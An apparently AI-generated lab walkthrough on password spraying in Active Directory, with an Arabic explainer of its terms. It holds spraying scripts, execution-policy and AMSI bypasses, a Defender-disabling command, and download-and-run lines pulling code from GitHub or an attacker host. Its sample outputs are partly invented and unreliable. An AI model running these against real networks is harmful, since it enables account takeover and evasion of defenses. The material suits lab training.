
# Q:### Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.




# Internal Password Spraying from Windows — Complete Beginner's Guide

---

## 1\. THE QUESTION & SYSTEMATIC THOUGHT PROCESS

### Re-stating the Question in Simple Terms

You have been given:

-   A target Windows machine at IP `10.129.113.216` (named `ACADEMY-EA-MS01`)
-   Login credentials: username `htb-student`, password `Academy_student_AD!`
-   A mission: Find **which domain user account** has the password `Winter2022`

Think of it like this: Imagine a building with 2,000+ employee keycards. You don't know which employee uses the combination `door + code "Winter2022"`. So instead of guessing one employee at a time (which might trigger an alarm), you try **one password against ALL employees simultaneously**. That is password spraying.

---

### The Hacker's Mindset for This Problem

```
[You, the Attacker]
       |
       v
[RDP into ACADEMY-EA-MS01 as htb-student]
       |
       v
[You are now a low-privilege domain user INSIDE the network]
       |
       v
[Query Active Directory → Get a list of ALL domain users automatically]
       |
       v
[Try password "Winter2022" against every user account — ONE attempt per user]
       |
       v
[One or more users will authenticate successfully → That is your answer]
```

**Why only ONE password attempt per user?**  
Active Directory has a **lockout policy** — if you try the wrong password too many times for the same account, it gets locked out. This would alert defenders AND break the account. Password spraying avoids this by rotating the victim (user) while keeping the password constant.

---

### Why DomainPasswordSpray.ps1 is the Core Solution

The module explicitly demonstrates this tool. It:

1.  **Auto-generates** a user list from AD (no manual work needed)
2.  **Reads the password policy** so it knows how many attempts are safe
3.  **Excludes** accounts already near lockout threshold
4.  **Writes results** to an output file

This is the path of least resistance on a domain-joined Windows host with no additional setup required.

---

## 2\. SIX DISTINCT SOLUTION APPROACHES

---

### 🔵 Approach 1 — DomainPasswordSpray.ps1 (Primary Method, Shown in Module)

**What it is:** A PowerShell script specifically designed for password spraying inside an Active Directory environment from a domain-joined Windows host.

**Step-by-step commands:**

powershell

```
# Step 1: Open PowerShell on the RDP session and navigate to the tools folder
cd C:\Tools

# Step 2: Import the module into your current PowerShell session
Import-Module .\DomainPasswordSpray.ps1

# Step 3: Run the spray with Winter2022 as the target password
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

> **Why `-ErrorAction SilentlyContinue`?** This suppresses red error messages that appear for every failed login attempt, keeping your screen clean and readable.

**Expected Output (Visual Example):**

```
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] Now trying password Winter2022 against 2923 users. Current time is 3:15 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:USERNAME_HERE Password:Winter2022   ← THIS IS YOUR ANSWER
[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

After completion, read your results file:

powershell

```
type spray_success
# or
Get-Content spray_success
```

**Failure Scenarios:**

Failure Cause

What You'll See

Script not found

`Import-Module : The specified module was not found`

PowerShell execution policy blocking scripts

`cannot be loaded because running scripts is disabled`

Not domain-joined / wrong credentials

Tool will fail to query AD, or return 0 users

Firewall blocking LDAP (port 389)

Script hangs with no users found

**Pivot Trigger:** Stop and move to Approach 2 if:

-   Module import fails with execution policy errors
-   The user list comes back as 0 users
-   The script hangs for more than 3 minutes without output

---

### 🔵 Approach 2 — Bypass Execution Policy First, Then Run DomainPasswordSpray.ps1

**What it is:** Sometimes PowerShell's security settings block script execution. This approach bypasses that restriction before importing the tool.

**Commands:**

powershell

```
# Method A: Bypass policy for current process only (safest bypass)
powershell -ep bypass

# Now you are in a new PowerShell session with execution policy bypassed
cd C:\Tools
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

powershell

```
# Method B: Dot-sourcing the script instead of importing
. .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

powershell

```
# Method C: Read the file content and invoke it as a string (bypasses file-based restrictions)
IEX (Get-Content .\DomainPasswordSpray.ps1 -Raw)
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

**Expected Output:**  
Same as Approach 1 — you will see the `[*] SUCCESS! User:...` line.

**Failure Scenarios:**

-   If the machine has **Constrained Language Mode** enforced, `IEX` will be blocked
-   If **AppLocker** is blocking PowerShell scripts entirely, none of these bypasses work

**Pivot Trigger:** If you see `This script contains malicious content and is blocked` or CLM errors, move to Approach 3 (a binary/EXE instead of a script).

---

### 🔵 Approach 3 — Kerbrute for Windows (Binary, No Script Needed)

**What it is:** Kerbrute is a compiled executable (`.exe`) that performs Kerberos-based user enumeration and password spraying. Since it's a binary (not a PowerShell script), it's not blocked by script execution policies.

**Step 1:** You need a user list first. Generate one using PowerShell's AD module:

powershell

```
# Get all enabled user accounts and save to a file
Get-ADUser -Filter {Enabled -eq $true} -Properties SamAccountName | 
    Select-Object -ExpandProperty SamAccountName | 
    Out-File C:\Tools\userlist.txt
```

**Step 2:** Run Kerbrute

powershell

```
cd C:\Tools

# Run password spray using Kerbrute
.\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\userlist.txt Winter2022
```

> **Note:** Replace `INLANEFREIGHT.LOCAL` with the actual domain name. You can find it by running `$env:USERDNSDOMAIN` in PowerShell.

**Expected Output:**

```
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 07/24/26
Brute-forcing passwords at 10.129.113.216 (INLANEFREIGHT.LOCAL)

2026/07/24 15:17:03 >  Using KDC(s):
2026/07/24 15:17:03 >       dc01.inlanefreight.local:88

2026/07/24 15:17:45 >  [+] VALID LOGIN: USERNAME_HERE@INLANEFREIGHT.LOCAL:Winter2022
2026/07/24 15:17:46 >  Done! Tested 2923 logins (1 successes) in 43.000 seconds
```

**Failure Scenarios:**

-   Port 88 (Kerberos) is blocked by firewall
-   You get the domain name wrong
-   The `kerbrute_windows_amd64.exe` is not in `C:\Tools`

**Pivot Trigger:** If you see `KDC unreachable` or `connection refused` after 30 seconds, Kerberos port is blocked. Move to Approach 4.

---

### 🔵 Approach 4 — Manual PowerShell LDAP Authentication Test (No External Tools)

**What it is:** Uses only built-in Windows/.NET classes to manually test credentials against Active Directory via LDAP. Zero external tools needed — this is your "living off the land" approach.

**Commands:**

powershell

```
# Step 1: Get a list of all domain users
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
$searcher.PageSize = 1000
$users = $searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"][0] }

Write-Host "[*] Found $($users.Count) users"

# Step 2: Test the password against each user
$password = "Winter2022"
$domainName = $env:USERDNSDOMAIN

foreach ($user in $users) {
    try {
        $entry = New-Object System.DirectoryServices.DirectoryEntry(
            "LDAP://$domainName",
            $user,
            $password
        )
        # Force a bind attempt
        $test = $entry.NativeObject
        Write-Host "[+] SUCCESS: User=$user Password=$password" -ForegroundColor Green
    } catch {
        # Silently skip failed attempts
    }
}
```

**Expected Output:**

```
[*] Found 2923 users
[+] SUCCESS: User=USERNAME_HERE Password=Winter2022
```

**Failure Scenarios:**

-   Very slow — testing 2923 users one-by-one takes time
-   LDAP port 389 blocked (use 636 for LDAPS instead)
-   Script might get killed by AV/EDR on a hardened host

**Pivot Trigger:** If the script runs for more than 10 minutes with no output, or if it's killed immediately by antivirus/AMSI, move to Approach 5.

---

### 🔵 Approach 5 — Using `net use` Command (Oldest, Simplest Method)

**What it is:** The `net use` command is a built-in Windows command for connecting to network shares. It can be (ab)used to test credentials against SMB. It requires knowing usernames in advance.

**Commands:**

powershell

```
# First, get the user list as before
$users = (Get-ADUser -Filter {Enabled -eq $true}).SamAccountName

# Test each user
foreach ($user in $users) {
    $result = net use \\$env:LOGONSERVER\IPC$ /user:"$env:USERDOMAIN\$user" "Winter2022" 2>&1
    if ($result -notlike "*error*") {
        Write-Host "[+] SUCCESS: $user : Winter2022" -ForegroundColor Green
        net use \\$env:LOGONSERVER\IPC$ /delete | Out-Null  # Clean up
    }
}
```

**Expected Output:**

```
[+] SUCCESS: USERNAME_HERE : Winter2022
```

**Failure Scenarios:**

-   SMB (port 445) might be restricted between workstations
-   `Active Directory module` (`Get-ADUser`) might not be loaded — you'd need `Import-Module ActiveDirectory` first
-   Extremely noisy — generates Event ID 4625 for every failure, easily detected

**Pivot Trigger:** If `Get-ADUser` fails (module not installed) or if SMB connections are blocked (you get "network path not found"), move to Approach 6.

---

### 🔵 Approach 6 — Rubeus (Advanced — Kerberos AS-REQ Spraying)

**What it is:** Rubeus is a C# Kerberos toolkit. Its `brute` command performs password spraying at the Kerberos protocol level (AS-REQ), which is stealthier than LDAP/SMB-based methods.

**Commands:**

powershell

```
cd C:\Tools

# First generate a user list
Get-ADUser -Filter {Enabled -eq $true} | 
    Select-Object -ExpandProperty SamAccountName | 
    Out-File C:\Tools\users.txt

# Run Rubeus password spray
.\Rubeus.exe brute /users:C:\Tools\users.txt /password:Winter2022 /dc:dc01.inlanefreight.local /domain:inlanefreight.local /outfile:rubeus_results.txt
```

**Expected Output:**

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Brute Force

[*] Using LDAP to query users
[+] TGTDELEG  : ...ticket data...
[*] TICKET : USERNAME_HERE
[+] Username     : USERNAME_HERE
[+] Password     : Winter2022
```

**Failure Scenarios:**

-   Rubeus.exe not in `C:\Tools`
-   AV/EDR detects and quarantines Rubeus immediately (it's very well-known)
-   Wrong DC FQDN

**Pivot Trigger:** If Rubeus gets quarantined immediately or if you see `Access Denied` when trying to run it, you need an obfuscated version or a different tool entirely.

---

## 3\. THE "WHAT IF" MASTERCLASS

---

**🔴 What If #1 — PowerShell says "running scripts is disabled" when importing DomainPasswordSpray.ps1?**

**The Problem:** Windows PowerShell has an **Execution Policy** setting that controls whether `.ps1` files can run. The default is often `Restricted` (no scripts allowed).

**Diagnosis:** You'll see this error:

```
File .\DomainPasswordSpray.ps1 cannot be loaded because running scripts is disabled 
on this system. For more information, see about_Execution_Policies at 
https://go.microsoft.com/fwlink/?LinkID=135170.
```

**The Fix — 4 bypass methods:**

powershell

```
# Fix 1: Launch a new PowerShell process with bypass (BEST METHOD — safe, temporary)
powershell.exe -ExecutionPolicy Bypass -File .\DomainPasswordSpray.ps1

# Fix 2: Set policy for current user only
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

# Fix 3: Encode→Decode trick using Base64
$code = Get-Content .\DomainPasswordSpray.ps1 -Raw
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
powershell -EncodedCommand $encoded

# Fix 4: Read and pipe directly
Get-Content .\DomainPasswordSpray.ps1 | Invoke-Expression
```

**Key Learning:** Execution policy is **not a security boundary** — it's a convenience feature. Any local administrator (or the user themselves) can bypass it. Real security comes from AppLocker and Constrained Language Mode.

---

**🔴 What If #2 — The DomainPasswordSpray.ps1 tool is NOT in C:\\Tools? What if there are no tools at all on the host?**

**The Problem:** You RDP in and find `C:\Tools` is empty, or the directory doesn't exist. This happens on CTF-style machines that reset their tools, or in real engagements where you've landed on a "clean" host.

**Step 1 — Download the tool from GitHub (if internet access exists):**

powershell

```
# Download directly into memory and execute (fileless method)
IEX (New-Object Net.WebClient).DownloadString(
    'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1'
)
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

**Step 2 — If no internet, transfer from your attacker machine:**

On your Linux/Parrot attacker machine:

bash

```
# Host the file via a simple HTTP server
python3 -m http.server 8080
```

On the Windows victim:

powershell

```
# Download from attacker machine (replace with your attacker IP)
Invoke-WebRequest -Uri "http://YOUR_ATTACKER_IP:8080/DomainPasswordSpray.ps1" -OutFile C:\Windows\Temp\spray.ps1
Import-Module C:\Windows\Temp\spray.ps1
```

**Step 3 — Use only built-in Windows tools (no download needed):**  
Fall back to the manual LDAP PowerShell method shown in Approach 4 — it uses **zero external tools**.

---

**🔴 What If #3 — The spray returns 0 users? The tool says "Created a userlist containing 0 users"?**

**The Problem:** The tool queries Active Directory via LDAP to build the user list. If the query fails silently, you get 0 users and no spray is attempted.

**Root Causes:**

-   The `htb-student` account may not have LDAP read permissions
-   LDAP (port 389) is firewalled
-   Domain name resolution is broken on this host

**Diagnosis:**

powershell

```
# Test 1: Can you resolve the domain?
nslookup inlanefreight.local

# Test 2: Can you reach the DC on LDAP port?
Test-NetConnection -ComputerName dc01.inlanefreight.local -Port 389

# Test 3: Can you query AD at all?
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Test 4: Check what domain this machine is joined to
$env:USERDNSDOMAIN
$env:LOGONSERVER
```

**The Fix:** Manually build a user list using a different method:

powershell

```
# Method A: Using net.exe (built-in)
net group "Domain Users" /domain | 
    Where-Object {$_ -match '^\S'} | 
    Out-File C:\Tools\manual_users.txt

# Method B: Use the user list with the spray tool
Invoke-DomainPasswordSpray -UserList C:\Tools\manual_users.txt -Password Winter2022 -OutFile spray_success
```

---

**🔴 What If #4 — Antivirus / Windows Defender quarantines DomainPasswordSpray.ps1 the moment you try to import it?**

**The Problem:** Modern AV solutions have signatures for well-known hacking tools including `DomainPasswordSpray.ps1`. The moment you try to load the file, Defender kills the process.

**Signs this is happening:**

```
Import-Module : Could not load file or module
# AND you see a Windows Defender notification popup
# OR the file disappears from C:\Tools
```

**Fix 1 — Temporarily disable Defender (requires local admin):**

powershell

```
# Check if you have admin rights first
[Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Disable real-time monitoring temporarily
Set-MpPreference -DisableRealtimeMonitoring $true

# Run your spray, then re-enable
Set-MpPreference -DisableRealtimeMonitoring $false
```

**Fix 2 — Use the purely built-in PowerShell approach (no signature to detect):**

The manual LDAP loop from Approach 4 uses only native .NET classes — no "hacking tool" signatures. AV products won't recognize it as malicious.

**Fix 3 — AMSI Bypass (Advanced — for CPTS knowledge):**

powershell

```
# AMSI (AntiMalware Scan Interface) is what PowerShell uses to send code to AV
# This one-liner patches AMSI in memory for the current session:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

> ⚠️ **Educational Note:** AMSI bypasses are a cat-and-mouse game — new bypasses emerge constantly as old ones get signatures. For CPTS, understand the concept; don't memorize a specific bypass.

---

**🔴 What If #5 — You spray successfully but got MULTIPLE successes? How do you know which username is "the" answer?**

**The Problem:** Real AD environments often have many users with weak/seasonal passwords. A spray against "Winter2022" might return several usernames.

**Example output:**

```
[*] SUCCESS! User:jsmith Password:Winter2022
[*] SUCCESS! User:dbranch Password:Winter2022
[*] SUCCESS! User:mwilson Password:Winter2022
```

**How to determine the "right" answer for HTB:**

In a CTF/lab context, the question asks for "a user" — **any one of them** is usually correct. Try submitting the first one that appears.

**In a real pentest, your next steps would be:**

powershell

```
# Step 1: Check what groups the discovered user belongs to
Get-ADUser -Identity jsmith -Properties MemberOf | Select-Object MemberOf

# Step 2: Check if they are a local admin anywhere
# (This is called "lateral movement" — your next phase)

# Step 3: Prioritize users who are in privileged groups
Get-ADGroupMember -Identity "Domain Admins" | Select-Object SamAccountName
Get-ADGroupMember -Identity "Remote Management Users" | Select-Object SamAccountName
```

**CPTS Mindset:** Every successful spray result is a potential **lateral movement** opportunity. Even a low-privilege user with a discovered password is valuable — they might have local admin on a server, or access to a file share with sensitive data.

---

**🔴 What If #6 — What if you CAN'T RDP at all? The RDP connection (port 3389) is refused or timed out?**

**The Problem:** RDP (TCP port 3389) may be blocked by a firewall, disabled on the target, or the credentials may be wrong.

**Step 1 — Verify RDP port from your attacker machine first:**

bash

```
# From Linux attacker machine
nmap -p 3389 10.129.113.216

# Or with netcat
nc -zv 10.129.113.216 3389
```

**Step 2 — If RDP is open but credentials fail, double-check:**

-   Username: `htb-student`
-   Password: `Academy_student_AD!` (note the `!` at the end — copy-paste exactly)
-   Domain: try `INLANEFREIGHT\htb-student` (domain-prefix format)

**Step 3 — If RDP is blocked, use alternative remote access:**

bash

```
# Option A: Connect via WinRM (PowerShell Remoting, port 5985)
evil-winrm -i 10.129.113.216 -u htb-student -p 'Academy_student_AD!'

# Once inside evil-winrm, run the same commands:
cd C:\Tools
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

bash

```
# Option B: Use xfreerdp (better Linux RDP client with more options)
xfreerdp /v:10.129.113.216 /u:htb-student /p:'Academy_student_AD!' /drive:.,/tmp /dynamic-resolution
```

> **The `/drive:.,/tmp` flag** mounts your local `/tmp` folder as a shared drive inside the RDP session — super useful for transferring tools!

**Step 4 — Run the spray directly from Linux using CrackMapExec:**

bash

```
# If you can't get onto the Windows box at all, spray from Linux
crackmapexec smb 10.129.113.216 -u /tmp/users.txt -p Winter2022 --no-bruteforce --continue-on-success
```

---

## 📋 Quick Reference Cheat Sheet

```
GOAL: Find user with password Winter2022
======================================================
RDP Target  : 10.129.113.216
Username    : htb-student
Password    : Academy_student_AD!
Tools Path  : C:\Tools
======================================================

FASTEST PATH TO ANSWER:
1. RDP in
2. Open PowerShell
3. cd C:\Tools
4. powershell -ep bypass
5. Import-Module .\DomainPasswordSpray.ps1
6. Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
7. Press Y to confirm
8. Read the SUCCESS line → that username is your answer
9. Verify: type spray_success
======================================================
```

> 💡 **Final Beginner Tip:** The most important thing to understand isn't the specific tool — it's the **concept**: you are exploiting the weak human habit of using predictable, seasonal passwords (`Winter2022`, `Spring2023`, `Company123!`). Every tool above is just a different vehicle for the same idea. Master the concept, and the tools become interchangeable.

$0.138,392 tok148.7s

8

Responses are AI-generated and can be inaccurate. Review all outputs before relying on them.

Select a modelSelect a model




### **Arabic (For junior)**

تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

توثيق وتجهيز هالمعلومات وترتيبها بملفات الـ Obsidian مالتك هسة، راح يخليك جاهز تماماً وتختصر عليك هواي مراجعات حتى تعبر امتحان الـ CPTS بنهاية سنة التفرغ بكل ثقة. هذا السيناريو هو أساسي جداً بشغل الـ Red Teaming.

━━━━━

🟢 المرحلة 0: ما قبل الصفر — Big Picture

⚠️ تذكر دائماً: الفهم يسبق التطبيق. إذا حفظت الأوامر بدون ما تفهم ليش كاعد نكتبها، راح توكف بأول مطب يواجهك بالواقع.

تخيل وياي السيناريو التالي: أنت هسة موظف أمن سيبراني، أو خلينا نكول أنت مختبر اختراق (Penetration Tester) كاعد داخل شبكة شركة ضخمة. هاي الشركة بيها آلاف الموظفين. كل موظف عنده حاسبة، وكلهم مربوطين بشبكة وحدة مركزية يتحكم بيها سيرفر عظيم اسمه الـ Domain Controller. هذا السيرفر هو "عقل" الشركة، وهو اللي يقرر منو يدخل ومنو ينمنع بناءً على اسم المستخدم وكلمة المرور مالتهم.

هسة، الشركات دائماً تفرض سياسات معقدة لكلمات المرور. تكول للموظف: "لازم الباسورد مالتك يكون بيه حرف كبير، ورقم، ورمز، ولازم تغيره كل ٩٠ يوم". الموظف البسيط، اللي ما يهمه الأمن السيبراني بكد ما يهمه يخلص شغله ويرجع لبيته، راح يدور على أسهل طريقة يلتف بيها على هاي القوانين المعقدة حتى ما ينسى الباسورد. فشراح يسوي؟ راح يستخدم كلمات مرور موسمية يسهل تذكرها وتطابق الشروط بنفس الوقت. مثلاً، إذا أحنا بفصل الشتاء وسنة ٢٠٢٢، راح يخلي الباسورد مالته `Winter2022`. وإذا بالصيف راح يخليه `Summer2023!`. هاي ظاهرة بشرية نفسية بحتة، والمخترقين يعرفوها كلش زين ويبنون هجماتهم على أساسها.

في الزمن القديم، المخترقين كانوا يستخدمون أسلوب "القوة العمياء" (Brute Force). يعني المخترق يجيب اسم مستخدم واحد (مثلاً مدير النظام Administrator) ويجيب قائمة بيها ملايين كلمات المرور، ويبدأ يجربها كلها على هذا المستخدم المكسين. باسورد ورا باسورد، ومئات المحاولات بالثانية.

لكن مسؤولي الحماية مو نايمين. انتبهوا لهالشي وسووا آلية دفاعية اسمها "سياسة قفل الحساب" (Account Lockout Policy). هاي السياسة تكول: "إذا شخص حاول يدخل الباسورد غلط ٥ مرات متتالية، اقفل الحساب مالته لمدة نص ساعة، ونزّل تنبيه أحمر يم مسؤول الحماية".

هنا المخترقين انصدموا بواقع جديد. إذا أظل أجرب ملايين الباسوردات على يوزر واحد، من خامس محاولة راح ينقفل الحساب، وتفشل العملية، وانكشف، وينطرد اليوزر من شغله لحد ما يخابر الدعم الفني. يعني استراتيجية القوة العمياء التقليدية ماتت وانتهت بالشبكات الحديثة.

فشلون المخترق الذكي يتعامل ويا هاي الآلية الدفاعية؟ شلون نكدر نخترق حسابات بدون ما نقفلها وبدون ما نثير أي انتباه؟

الجواب هو قلب التحدي مالتنا اليوم: هجوم رش كلمات المرور (Password Spraying).

الفكرة هنا هي أن نقلب المعادلة تماماً. بدل ما نثبت "اسم المستخدم" ونجرب عليه آلاف "كلمات المرور" (وهذا يسبب القفل)، راح نثبت "كلمة مرور وحدة فقط" (مثل كلمة `Winter2022` اللي متأكدين اكو موظف كسول استخدمها)، ونجربها على "آلاف المستخدمين" بالشركة.

يعني نروح للموظف الأول: نجرب `Winter2022`.. فشل؟ نعوفه ونروح للثاني.

الموظف الثاني: نجرب `Winter2022`.. فشل؟ نعوفه ونروح للثالث.

شنو اللي سويناه هسة؟

أولاً: جربنا محاولة واحدة فاشلة فقط لكل مستخدم، يعني ما وصلنا للحد الأقصى مال القفل (اللي هو مثلاً ٥ محاولات). الحسابات كلها بقت شغالة وسليمة.

ثانياً: الأنظمة الأمنية ما راح تكتشف هذا الهجوم بسهولة، لأنها مصممة تدور على "محاولات فشل متكررة على حساب واحد"، ومو مصممة تدور على "محاولة فشل واحدة متوزعة على آلاف الحسابات". أنت كاعد تمشي تحت الرادار (Low and Slow).

ثالثاً: لأننا كاعد نستخدم كلمة مرور موسمية ومنتشرة وضعيفة، نسبة النجاح مالتنا شبه مؤكدة في الشركات الكبيرة. مستحيل من بين ٢٠٠٠ موظف ما نلگي واحد على الأقل استخدم هذا الباسورد السهل.

هذا التحدي يقع ضمن مجال "رفع الصلاحيات والحركة الجانبية داخل بيئة Active Directory". أنت بالفعل كدرت تخترق حاسبة عادية، وعندك يوزر عادي وصلاحياته ضعيفة. هدفك هسة مو تخترق الحاسبة نفسها، بل تستخدم هاي الحاسبة كنقطة انطلاق (Pivot) حتى تستجوب الشبكة كلها، تسحب أسماء كل الموظفين، وترش عليهم هالباسورد الضعيف، عسى ولعل يطيح بيدك حساب مال مدير أو شخص عنده صلاحيات أعلى بكثير من صلاحياتك الحالية، وتكدر من خلاله تسيطر على الشبكة بالكامل.

شنو راح نتعلم بالنهاية من هذا التحدي؟

١. كيف نفهم عقلية المدافعين وكيف نتلاعب بقواعدهم الأمنية (مثل سياسة القفل) لصالحنا.

٢. كيف نستخدم أدوات باورشيل (PowerShell) اللي تعتبر من أخطر الأسلحة المتاحة لأنها موجودة أصلاً بكل حاسبات الويندوز (Living off the Land).

٣. كيف نستخرج قائمة بجميع مستخدمين الشبكة بشكل أوتوماتيكي ومخفي بدون ما نضطر نكتبهم بيدنا واحد واحد.

━━━━━

🔵 المرحلة 1: المصطلحات

مثل ما اتفقنا، ما راح نعبر أي مصطلح غريب بدون ما نفلشه تفليش حتى تفهمه بعمق وتكدر تشرحه لأي شخص يمر عليك. اقرأ هالمصطلحات بتركيز لأنها الأساس اللي راح نبني عليه استغلالنا.

Active Directory / AD (الدليل النشط)

- شنو يعني؟ هو اختراع من شركة مايكروسوفت، وهو عبارة عن قاعدة بيانات ضخمة ونظام إدارة مركزي يستخدم بالشركات. تخيل انه سجل مدني كامل لكل شيء بالشركة: كل موظف (User)، كل حاسبة (Computer)، كل طابعة، وكل مجموعة صلاحيات. الدليل النشط هو اللي يقرر منو يدخل لوين وشنو يكدر يسوي.
    
- وين يظهر بالأدوات/الأوامر؟ يظهر دائماً لما نتعامل ويا بيئة الـ Domain، مثل أوامر استخراج البيانات أو بالـ BloodHound أو أي أداة تستهدف شبكات مايكروسوفت.
    
- مثال بسيط: مثل موظف الاستعلامات اللي بباب الشركة، عنده دفتر بيه أسماء كل الموظفين وصلاحياتهم. من تجي تريد تدخل لغرفة معينة، يشيك الدفتر مالته (الـ AD) ويشوف مسموح لك لو لا.
    

Domain Controller / DC (متحكم المجال)

- شنو يعني؟ هو السيرفر (الخادم) الفعلي اللي يشتغل عليه نظام الـ Active Directory. هو القلب النابض للشبكة والملك المتوج مالتها. إذا كدرت تخترق الـ DC وتصير أدمن عليه، أنت فعلياً احتليت الشركة بالكامل وتكدر تسوي أي شيء يعجبك.
    
- وين يظهر بالأدوات/الأوامر؟ يظهر بالـ flags اللي تحدد الهدف، مثل `-dc-ip` في أدوات بايثون أو لما نستجوب الشبكة.
    
- مثال بسيط: إذا كان الـ AD هو الدفتر اللي بيه القوانين، فالـ DC هو المدير العنيف اللي كاعد على الكرسي يطبق هاي القوانين ويطرد المخالفين.
    

Password Spraying (رش كلمات المرور)

- شنو يعني؟ هو هجوم أفقي. يعني نأخذ كلمة مرور واحدة ضعيفة بس محتملة جداً (مثل اسم الشركة وسنة التأسيس، أو فصول السنة)، ونجربها على كل أسماء المستخدمين الموجودين بالشركة بمحاولة واحدة فقط لكل مستخدم. الهدف منه تجاوز سياسات الحماية اللي تقفل الحسابات.
    
- وين يظهر بالأدوات/الأوامر؟ يظهر بأسماء الأدوات المخصصة لهذا الغرض مثل `DomainPasswordSpray.ps1` أو أدوات مثل `CrackMapExec` أو `NetExec` لما نمرر الها ملف يوزرات ويا باسورد واحد.
    
- مثال بسيط: عندك مفتاح واحد لونه ذهبي، وعندك ألف باب مقفول. بدل ما تظل تجرب ألف مفتاح على باب واحد وتكسر القفل، تروح تجرب هذا المفتاح الذهبي مرة وحدة على كل الألف باب، أكيد واحد بيهم راح يفتح.
    

Brute Force (هجوم القوة العمياء)

- شنو يعني؟ هو هجوم عمودي. نأخذ اسم مستخدم واحد فقط (مثلاً Administrator)، ونجرب عليه آلاف أو ملايين كلمات المرور بسرعة خيالية. هذا الأسلوب مزعج جداً، يسوي ضجة بالشبكة (Logs)، ويؤدي دائماً إلى قفل الحساب الهدف بسرعة، ولذلك هو غير مفضل بالشبكات الداخلية الحديثة.
    
- وين يظهر بالأدوات/الأوامر؟ يظهر بأدوات كسر كلمات المرور مثل Hydra أو أوضاع معينة في Hashcat.
    
- مثال بسيط: شخص يحاول يفتح خزنة حديدية، فيجيب مطرقة ويظل يضرب بيها بكل قوته لحد ما تنكسر أو يخرب القفل نهائياً.
    

Account Lockout Policy (سياسة قفل الحساب)

- شنو يعني؟ هي إعدادات أمنية يفرضها مدير الشبكة لحماية الحسابات من الاختراق والتخمين المستمر. تتكون عادة من عنصرين: الأول "Lockout Threshold" (حد القفل) يعني كم مرة مسموح لك تغلط بالباسورد قبل ما ينقفل حسابك (مثلاً ٣ أو ٥ مرات). والثاني "Observation Window" (نافذة المراقبة) وهي المدة اللي النظام يحسب بيها هالأغلاط، والمدة اللي يبقى بيها الحساب مقفول (مثلاً ينقفل لمدة ٣٠ دقيقة).
    
- وين يظهر بالأدوات/الأوامر؟ أدوات الرش الذكية مثل أداة اليوم تقرأ هاي السياسة بشكل تلقائي قبل ما تبدأ الهجوم حتى تعرف شكد مسموح الها تغلط.
    
- مثال بسيط: جهاز الصراف الآلي (ATM). إذا دخلت الرمز مالتك غلط ٣ مرات، الصراف يبلع البطاقة مالتك ويقفل حسابك كإجراء أمني.
    

Domain-Joined Machine (جهاز منضم للمجال)

- شنو يعني؟ يعني حاسبة عادية (مثل حاسبة أي موظف) بس تم ربطها وإضافتها رسمياً إلى شبكة الشركة (الـ Domain). أهمية هذا الشيء للمخترق هي أن هاي الحاسبة تمتلك علاقة "ثقة" (Trust) مع سيرفر الشركة المركزي. وبالتالي تكدر تستجوب الشبكة وتطلب معلومات منها بدون ما النظام يرفضك.
    
- وين يظهر بالأدوات/الأوامر؟ مجرد كونك داخل حاسبة متصلة يعني تكدر تستخدم أوامر الويندوز العادية مثل `net user /domain` لاستخراج البيانات.
    
- مثال بسيط: موظف لابس الباج الرسمي مال الشركة ويتمشى بالممرات. حتى لو كان عامل نظافة (صلاحيات قليلة)، السكيورتي ما راح يشك بيه لأن عنده باج رسمي ومرخص يتواجد داخل المبنى.
    

